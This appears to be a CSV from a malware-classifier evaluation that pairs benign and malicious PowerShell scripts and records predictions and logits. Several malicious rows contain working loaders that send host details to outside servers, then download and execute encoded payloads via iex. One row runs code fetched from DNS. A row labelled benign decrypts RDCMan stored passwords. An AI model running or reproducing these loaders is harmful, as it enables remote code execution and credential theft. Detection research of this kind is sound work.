filename,label,source,primary_indicator,matched_indicators,indicator_count,has_indicator,raw_char_len,used_char_len,was_truncated,content,pair_idx,pair_role,pair_indicator,correct,predicted_label,logit_diff
1444.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,740,740,False,"function ConvertFrom-CBase64
{
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [AllowNull()]
        [AllowEmptyString()]
        [string[]]
        
        $Value,
        
        [Text.Encoding]
        
        $Encoding = ([Text.Encoding]::Unicode)
    )
    
    begin
    {
        Set-StrictMode -Version 'Latest'

        Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState
    }

    process
    {
        $Value | ForEach-Object {
            if( $_ -eq $null )
            {
                return $null
            }
            
            $bytes = [Convert]::FromBase64String($_)
            $Encoding.GetString($bytes)
        }
    }
}",6,benign,FromBase64String,True,benign,-3.4375
2139.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,4,True,857,857,False,"$sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider; $vc=$env:computername; $vu=$env:username; $vh=[system.convert]::tobase64string($sha1.ComputeHash([system.text.encoding]::utf8.getbytes($vc+$vu+$(gwmi win32_bios)))); $vs=[system.convert]::tobase64string([system.text.encoding]::utf8.getbytes($vc+'|'+$vu+'|'+'903f2f8cf535578b8c63dfcf5f1d3f549e489101')); $u='http://vanity-fair.org/news/rss.php?q='+$vs; $ps=(New-Object Net.WebClient).DownloadString($u); $ps=[Convert]::FromBase64String($ps); $n=$ps[0]; $k=$ps[1..$n]; $d=$ps[($n+1)..$ps.count]; for ($i=0; $i -lt $d.count -and $i -lt 1024; $i++){ $d[$i] = $d[$i] -bxor $k[$i % $n]; }; iex $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$d)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()",6,malicious,FromBase64String,True,malicious,8.0390625
2781.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,1062,1062,False,"[CmdletBinding()] 
    
Param ([Parameter(Mandatory)] [string[]] $memstream = $(Throw(""-memstream is required"")),
       [Parameter(Mandatory)] [string[]] $outputloc = $(Throw(""-outputloc is required""))
)

function Get-DecompressedByteArray {

	[CmdletBinding()] Param ([Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [byte[]] $byteArray)

	Process {
	    Write-Verbose ""Get-DecompressedByteArray""
        $input = New-Object System.IO.MemoryStream( , $byteArray )
	    $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
	    $gzipStream.CopyTo( $output )
        $gzipStream.Close()
		$input.Close()
		[byte[]] $byteOutArray = $output.ToArray()
        Write-Output $byteOutArray
    }
}


function Write-StreamToDisk {
    
    [io.file]::WriteAllBytes(""$outputloc"",$(Get-DecompressedByteArray -byteArray $([System.Convert]::FromBase64String($memstream))))

}

Write-StreamToDisk -memstream $memstream -outputloc $outputloc",7,benign,FromBase64String,True,benign,-0.890625
2792.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,8,True,882,882,False,"$uuid=(get-wmiobject win32_computersystemproduct).UUID;$wc=New-Object System.Net.WebClient;
$u='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.363 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.363';
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid; c=x3c93dlfcu53"");
$wc.Headers.Add('user-agent',$u);$reg=$wc.downloadstring(""https://www.appstats.pw/index.php"");
$wc.Headers.Remove([System.Net.HttpRequestHeader]::Cookie);
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid"");
$wc.headers.add('user-agent',$u);IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/3del.php""))));
while($true){
	try{
		$wc.headers.add('user-agent',$u);
		IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/index.php""))));
	}
	catch{
		sleep 180;
	}
}",7,malicious,FromBase64String,True,malicious,5.046875
4207.ps1,benign,natural_overlap,FromBase64String,FromBase64String,2,True,1883,1883,False,"﻿function Decrypt-RDCMan ($FilePath) {

    if (!$FilePath) {
        [xml]$config = Get-Content ""$env:LOCALAPPDATA\microsoft\remote desktop connection manager\rdcman.settings""
        $Xml = Select-Xml -Xml $config -XPath ""//FilesToOpen/*""
        $Xml | select-object -ExpandProperty ""Node""| % {Write-Output ""Decrypting file: "" $_.InnerText; Decrypt-RDCMan $_.InnerText}
    } else {
    [xml]$Types = Get-Content $FilePath

    $Xml = Select-Xml -Xml $Types -XPath ""//logonCredentials""

    
    $Xml | select-object -ExpandProperty ""Node"" | % { $pass = Decrypt-DPAPI $_.Password; $_.Domain + ""\"" + $_.Username + "" - "" + $Pass + "" - "" + ""Hash:"" + $_.Password + ""`n"" } 

    
    $Xml | select-object -ExpandProperty ""Node"" | % { $pass = Decrypt-DPAPI $_.Password.""
    }
}

function Decrypt-DPAPI ($EncryptedString) {
    
    Add-Type -assembly System.Security
    $encoding= [System.Text.Encoding]::ASCII
    $uencoding = [System.Text.Encoding]::UNICODE

    
    try {
    	$encryptedBytes = [System.Convert]::FromBase64String($encryptedstring)
        $bytes1 = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        [System.Text.Encoding]::Convert([System.Text.Encoding]::UNICODE, $encoding, $bytes1) | % { $myStr1 += [char]$_}
        echo $myStr1
    } 
    catch {
        
        try {
            $encryptedBytes = [System.Convert]::FromBase64String($encryptedstring)
            $bytes1 = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
            [System.Text.Encoding]::Convert([System.Text.Encoding]::UNICODE, $encoding, $bytes1) | % { $myStr1 += [char]$_}
            echo $myStr1
        }
	    catch {
            echo ""Could not decrypt password""
        }
    }
}",8,benign,FromBase64String,True,benign,-2.328125
3988.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,8,True,882,882,False,"$uuid=(get-wmiobject win32_computersystemproduct).UUID;$wc=New-Object System.Net.WebClient;
$u='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.363 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.363';
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid; c=x3c93dlfcu53"");
$wc.Headers.Add('user-agent',$u);$reg=$wc.downloadstring(""https://www.appstats.pw/index.php"");
$wc.Headers.Remove([System.Net.HttpRequestHeader]::Cookie);
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid"");
$wc.headers.add('user-agent',$u);IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/3del.php""))));
while($true){
	try{
		$wc.headers.add('user-agent',$u);
		IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/index.php""))));
	}
	catch{
		sleep 180;
	}
}",8,malicious,FromBase64String,True,malicious,5.078125
1637.ps1,benign,natural_overlap,IEX,IEX,1,True,886,886,False,"function Get-BootConfigurationData {
    param (
        $bcdeditpath = (Join-Path $env:SystemRoot 'system32\bcdedit.exe')
    )

    $bootconfigurationdata = iex $bcdeditpath
    $bootconfigurationdata += ''

    $hash = $null
    $result = foreach ($line in $bootconfigurationdata) {
        if ($line -eq '') {
            if ($hash) {
                [pscustomobject]$hash
            }
            $hash = @{}
            continue
        }
        if ($line.startswith('-----')) { continue }
        if ($line.startswith('Windows Boot')) {
            $hash.Add('Type', $line)
        } else {
            $name = $line.Substring(0, $line.IndexOf(' '))
            $value = $line.Substring($line.IndexOf(' ')).trim()
            $hash.Add($name, $value)
        }
    }

    $props = $result | % {gm -in $_ -ty *property} | % name | select -u | sort

    $result | select $props
}",9,benign,IEX,True,benign,-2.171875
784.ps1,malicious,natural_overlap,IEX,IEX,1,True,73,73,False,"if(""""+(nslookup -q=txt l.ns.huawel.ro.) -match ""@(.*)@""){iex $matches[1]}",9,malicious,IEX,True,malicious,0.375
329.ps1,benign,natural_overlap,Invoke-Expression,Invoke-Expression,2,True,880,880,False,"﻿function Import-PSFPowerShellDataFile
{

	[Diagnostics.CodeAnalysis.SuppressMessageAttribute(""PSAvoidUsingInvokeExpression"", """")]
	[CmdletBinding()]
	Param (
		[Parameter(ParameterSetName = 'ByPath')]
		[string[]]
		$Path,
		
		[Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'ByLiteralPath')]
		[Alias('PSPath')]
		[string[]]
		$LiteralPath
	)
	
	process
	{
		
		
		
		if (($ExecutionContext.Host.Runspace.InitialSessionState.LanguageMode -eq 'NoLanguage') -or ($PSVersionTable.PSVersion.Major -lt 5))
		{
			foreach ($resolvedPath in ($Path | Resolve-PSFPath -Provider FileSystem | Select-Object -Unique))
			{
				Invoke-Expression (Get-Content -Path $resolvedPath -Raw)
			}
			foreach ($pathItem in $LiteralPath)
			{
				Invoke-Expression (Get-Content -Path $pathItem -Raw)
			}
		}
		else
		{
			Import-PowerShellDataFile @PSBoundParameters
		}
	}
}",10,benign,Invoke-Expression,True,benign,-1.5
3335.ps1,malicious,natural_overlap,Invoke-Expression,Invoke-Expression|DownloadString|Net.WebClient,3,True,299,299,False,"$x=$Env:username;$u=""http://54.213.195.138/s2.txt?u="" + $x;$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;$s=$w.DownloadString($u);Invoke-Expression -Command $s;",10,malicious,Invoke-Expression,True,malicious,7.53125
485.ps1,benign,natural_overlap,Invoke-Expression,Invoke-Expression,3,True,1023,1023,False,"function Remove-EnvironmentVariableValue{



    [CmdletBinding()]
    param(

		[Parameter(Mandatory=$true)]
		[String]
		$Name,
        
		[Parameter(Mandatory=$true)]
		[String]
		$Value, 
         
		[Parameter(Mandatory=$true)]
		[String]
		$Target,  

		[Switch]
		$Clear  
	)  
  
    
    
    

    [Environment]::GetEnvironmentVariable($Name,$Target) | %{
                
        if(($_.Contains($Value) -or (Invoke-Expression ""`$env:$Name"").contains($Value)) -and -not $Clear){
            
            Write-Host ""Remove value: $Value from variable: $Name""            
            $Value = $_.Trim($Value)
            [Environment]::SetEnvironmentVariable($Name, $Value,$Target)
            Invoke-Expression ""`$env:$Name = `""$Value`""""
        
        }elseif($Clear){
        
            Write-Host ""Set value from variable: $Name to `$null""
            [Environment]::SetEnvironmentVariable($Name,$null,$Target)    
            Invoke-Expression ""`$env:$Name = `$null""        
        }
    }     
}       ",11,benign,Invoke-Expression,True,benign,-2.25
3387.ps1,malicious,natural_overlap,Invoke-Expression,Invoke-Expression|DownloadString|Net.WebClient,3,True,299,299,False,"$x=$Env:username;$u=""http://54.213.195.138/s2.txt?u="" + $x;$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;$s=$w.DownloadString($u);Invoke-Expression -Command $s;",11,malicious,Invoke-Expression,True,malicious,7.5
489.ps1,benign,natural_overlap,Invoke-Expression,Invoke-Expression,1,True,1040,1040,False,"function Get-PathAndFilename{



    [CmdletBinding()]
    param(

		[Parameter( Mandatory=$true)]
		[String]
		$Path
	)

    
    $Path = [System.Environment]::ExpandEnvironmentVariables($Path)
    
    
    if($Path.contains(""$"")){
        $Path = Invoke-Expression ""`""$Path`""""
    }

    
    if($Path.StartsWith(""\"")){
        $Path = Join-Path -Path $(Get-Location).Path -Childpath $Path
    }
    
    
    if(-not $Path.Contains(""\"")){
    
        $Filename = $Path
        $Path = $null
    
    }else{
    
        
        $ResolvedPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
        $Path = $ResolvedPath + $(if($Path.EndsWith(""\"") -and -not $ResolvedPath.EndsWith(""\"")){""\""})

        
        if($Path.EndsWith(""\"")){
        
            $Filename = $null
        
        }else{
            
            $Filename = Split-Path $Path -Leaf
            $Path = Split-Path $Path -Parent         
        }
    }
    
    @{
        Path = $Path
        Filename = $FileName    
    }
}",12,benign,Invoke-Expression,True,benign,-2.796875
3955.ps1,malicious,natural_overlap,Invoke-Expression,Invoke-Expression|DownloadString|Net.WebClient,3,True,299,299,False,"$x=$Env:username;$u=""http://54.213.195.138/s2.txt?u="" + $x;$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;$s=$w.DownloadString($u);Invoke-Expression -Command $s;",12,malicious,Invoke-Expression,True,malicious,7.5
583.ps1,benign,natural_overlap,Invoke-Expression,Invoke-Expression,3,True,1109,1109,False,"﻿

function Connect-RDP{



	param (
        [parameter(Mandatory=$true)]
        [string[]]$Name
	)
    
    
    
    
    if ((Get-Command ""cmdkey"") -and (Get-Command ""mstsc"")){ 
    
        
        
        $Servers = Get-RemoteConnection -Name $Name
       
        if(!(Get-ChildItem -Path $PSconfigs.Path -Filter $PStemplates.RDP.Name -Recurse)){
        
            Write-Host ""Copy $($PStemplates.RDP.Name) file to the config folder""        
    		Copy-Item -Path $PStemplates.RDP.FullName -Destination (Join-Path -Path $PSconfigs.Path -ChildPath $PStemplates.RDP.Name)
    	} 
		$RDPDefaultFile = $(Get-ChildItem -Path $PSconfigs.Path -Filter $PStemplates.RDP.Name -Recurse).Fullname		

        foreach($Server in $Servers){
		        
            $Servername = $Server.Name
            $Username = $Server.User

            
            $Null = Invoke-Expression ""cmdkey /delete:'$Servername'""

            
            $Null = Invoke-Expression ""cmdkey /generic:'$Servername' /user:'$Username'""

            
            Invoke-Expression ""mstsc '$RDPDefaultFile' /v:$Servername""
	    }
    }
}",13,benign,Invoke-Expression,True,benign,-1.3125
722.ps1,malicious,natural_overlap,Invoke-Expression,Invoke-Expression|DownloadString|Net.WebClient,3,True,304,304,False,"$x=$Env:username;$u=""http://www.bcbsarizona.org/s2.txt?u="" + $x;$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;$s=$w.DownloadString($u);Invoke-Expression -Command $s;",13,malicious,Invoke-Expression,True,malicious,4.203125
1767.ps1,benign,natural_overlap,Invoke-Expression,Invoke-Expression|FromBase64String,2,True,1224,1224,False,"﻿


try
{
    $defaultParamValues = $PSDefaultParameterValues.Clone()
    $PSDefaultParameterValues[""it:Skip""] = !$IsWindows

    Describe ""AMSI scan should detect suspicious content"" -Tags 'Feature','RequireAdminOnWindows' {

        BeforeAll {
            [System.Management.Automation.Internal.InternalTestHooks]::SetTestHook(""UseDebugAmsiImplementation"", $true)
        }

        AfterAll {
            [System.Management.Automation.Internal.InternalTestHooks]::SetTestHook(""UseDebugAmsiImplementation"", $false)
        }

        It ""Verifies AMSI scan detects debug suspicious content"" {

            $EICAR_STRING_B64 = ""awZ8EmMWc3JjaAdvY2lrBgcbY20aBHBwGgROF3Z6cHJhHmBncn13cmF3HnJ9Z3plemFmYB5ndmBnHnV6f3YSF3sYexk= ""
            $bytes = [System.Convert]::FromBase64String($EICAR_STRING_B64)
            $EICAR_STRING = -join ($bytes | ForEach-Object { [char]($_ -bxor 0x33) })
            { Invoke-Expression -Command ""echo '$EICAR_STRING'"" } |
                Should -Throw -ErrorId ""ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand""
        }
    }
}
finally
{
    if ($defaultParamValues -ne $null)
    {
        $Global:PSDefaultParameterValues = $defaultParamValues
    }
}",14,benign,Invoke-Expression,True,benign,-2.90625
